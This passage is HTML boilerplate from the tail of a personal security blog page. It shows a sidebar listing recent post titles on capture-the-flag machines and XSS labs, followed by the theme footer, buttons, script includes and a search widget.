href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
